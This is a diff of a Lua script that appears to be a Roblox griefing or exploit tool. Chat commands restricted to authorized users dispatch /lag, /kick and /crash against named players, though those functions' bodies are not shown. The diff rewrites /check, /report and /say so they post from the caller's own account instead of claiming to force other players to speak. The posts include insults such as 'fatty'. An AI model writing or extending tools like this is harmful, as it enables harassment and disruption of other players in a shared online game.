@@ -243,40 +243,28 @@ local function crashPlayer(name)
     end
 end
 
--- Services
-local TextChatService = game:GetService("TextChatService")
-local textChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+-- 1. /check - Makes YOU say the maid phrase
+local function maidChat()
+    local textChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+    textChannel:SendAsync("I'm glitchtale's maid >//<")
+end
 
--- 1. /check - Makes all players say the maid phrase
-local function forceAllChat()
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= localPlayer then
-            coroutine.wrap(function()
-                textChannel:SendAsync("I'm glitchtale's maid >//<")
-            end)()
-        end
+-- 2. /report NAME - Only works if YOU are the target
+local function reportSelf(sender, targetName)
+    if sender.Name:lower() == targetName:lower() then
+        local textChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+        textChannel:SendAsync("fatty")
     end
 end
 
--- 2. /report [name] - Makes target say "fatty"
-local function reportPlayer(targetName)
-    local target = getPlayer(targetName)
-    if target then
-        coroutine.wrap(function()
-            textChannel:SendAsync("fatty")
-        end)()
+-- 3. /say NAME TEXT - Only works if YOU are the target
+local function forceSelfChat(sender, targetName, text)
+    if sender.Name:lower() == targetName:lower() then
+        local textChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+        textChannel:SendAsync(text)
     end
 end
-
--- 3. /say [name] [text] - Forces target to say custom text
-local function forceSay(targetName, text)
-    local target = getPlayer(targetName)
-    if target then
-        coroutine.wrap(function()
-            textChannel:SendAsync(text)
-        end)()
-    end
-end
+ 
 
 local function onCommand(sender, message)
     if not authorizedUsers[sender.Name] then return end
@@ -308,11 +296,11 @@ elseif args[1] == "/lag" and args[2] then lagPlayer(args[2])
 elseif args[1] == "/kick" and args[2] then kickPlayer(args[2])
 elseif args[1] == "/crash" and args[2] then crashPlayer(args[2])
 elseif msg == "/check" then
-    forceAllChat()
+    maidChat()
 elseif args[1] == "/report" and args[2] then
-    reportPlayer(args[2])
+    reportSelf(sender, args[2])
 elseif args[1] == "/say" and args[2] and args[3] then
-    forceSay(args[2], table.concat(args, " ", 3))
+    forceSelfChat(sender, args[2], table.concat(args, " ", 3))
 end
 
 local function bindChatCommands(player)
